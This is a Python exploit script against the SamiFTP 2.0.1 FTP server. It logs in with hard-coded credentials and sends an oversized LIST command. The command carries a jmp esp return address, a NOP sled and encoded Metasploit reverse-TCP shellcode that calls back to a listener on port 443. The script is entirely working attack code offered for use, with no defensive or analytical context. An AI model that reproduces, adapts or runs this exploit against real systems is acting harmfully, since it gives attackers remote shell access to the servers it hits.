#!/usr/bin/python 
import os,sys,time,socket

#---------------------------------------------------------------------------#
# 				Name:	Rio Atmadja			    #
# 			      Script: 	samiftp_2.0.1 exploit		    #
#---------------------------------------------------------------------------#

if len(sys.argv) != 2:
	print "[*] Usage: %s <ip_address> \n" % sys.argv[0]
	sys.exit(0)

target = sys.argv[1]

# msfpayload windows/shell_reverse_tcp LHOST=192.168.10.1 LPORT=443 R | msfencode -b "\x00\x0a\x5c" -t c
shellcode = ("\xb8\xbc\x71\xe6\x06\xdb\xce\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
"\x4f\x31\x42\x14\x03\x42\x14\x83\xc2\x04\x5e\x84\x1a\xee\x17"
"\x67\xe3\xef\x47\xe1\x06\xde\x55\x95\x43\x73\x69\xdd\x06\x78"
"\x02\xb3\xb2\x0b\x66\x1c\xb4\xbc\xcc\x7a\xfb\x3d\xe1\x42\x57"
"\xfd\x60\x3f\xaa\xd2\x42\x7e\x65\x27\x83\x47\x98\xc8\xd1\x10"
"\xd6\x7b\xc5\x15\xaa\x47\xe4\xf9\xa0\xf8\x9e\x7c\x76\x8c\x14"
"\x7e\xa7\x3d\x23\xc8\x5f\x35\x6b\xe9\x5e\x9a\x68\xd5\x29\x97"
"\x5a\xad\xab\x71\x93\x4e\x9a\xbd\x7f\x71\x12\x30\x7e\xb5\x95"
"\xab\xf5\xcd\xe5\x56\x0d\x16\x97\x8c\x98\x8b\x3f\x46\x3a\x68"
"\xc1\x8b\xdc\xfb\xcd\x60\xab\xa4\xd1\x77\x78\xdf\xee\xfc\x7f"
"\x30\x67\x46\x5b\x94\x23\x1c\xc2\x8d\x89\xf3\xfb\xce\x76\xab"
"\x59\x84\x95\xb8\xdb\xc7\xf1\x0d\xd1\xf7\x01\x1a\x62\x8b\x33"
"\x85\xd8\x03\x78\x4e\xc6\xd4\x7f\x65\xbe\x4b\x7e\x86\xbe\x42"
"\x45\xd2\xee\xfc\x6c\x5b\x65\xfd\x91\x8e\x29\xad\x3d\x61\x89"
"\x1d\xfe\xd1\x61\x74\xf1\x0e\x91\x77\xdb\x38\x96\xe0\x24\x92"
"\x12\xf0\xcc\xe1\x22\xf3\xb7\x6f\xc4\x99\xd7\x39\x5f\x36\x41"
"\x60\x2b\xa7\x8e\xbe\xbb\x44\x1c\x25\x3b\x02\x3d\xf2\x6c\x43"
"\xf3\x0b\xf8\x79\xaa\xa5\x1e\x80\x2a\x8d\x9a\x5f\x8f\x10\x23"
"\x2d\xab\x36\x33\xeb\x34\x73\x67\xa3\x62\x2d\xd1\x05\xdd\x9f"
"\x8b\xdf\xb2\x49\x5b\x99\xf8\x49\x1d\xa6\xd4\x3f\xc1\x17\x81"
"\x79\xfe\x98\x45\x8e\x87\xc4\xf5\x71\x52\x4d\x05\x38\xfe\xe4"
"\x8e\xe5\x6b\xb5\xd2\x15\x46\xfa\xea\x95\x62\x83\x08\x85\x07"
"\x86\x55\x01\xf4\xfa\xc6\xe4\xfa\xa9\xe7\x2c")

jmp_esp = "\x53\x93\x42\x7e" # 7E429353 (jmp esp -> user32.dll)
payload = '\x41' * 217 + jmp_esp + '\x90' * 36 + shellcode + '\x90' * ( 2000 - ( 217 + 4 + 32 + len(shellcode)) )

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[+] Connect to %s on port %d " % (target,21)
try:

	s.connect((target,21))
	s.recv(1024) 
	s.send('USER jeff\r\n')
	s.recv(1024)
	s.send('PASS 123qwe\r\n')
	s.recv(1024)
	s.send("LIST" + payload + "\r\n" )
	print "[+] Sending payload of size " + str(len(payload)) + " Bytes"
	s.close()
	print "[+] Exploit Sent Sucessfully" 

except:
	print "[-] Could not connect to " + target + ":21\r"
	sys.exti(0)








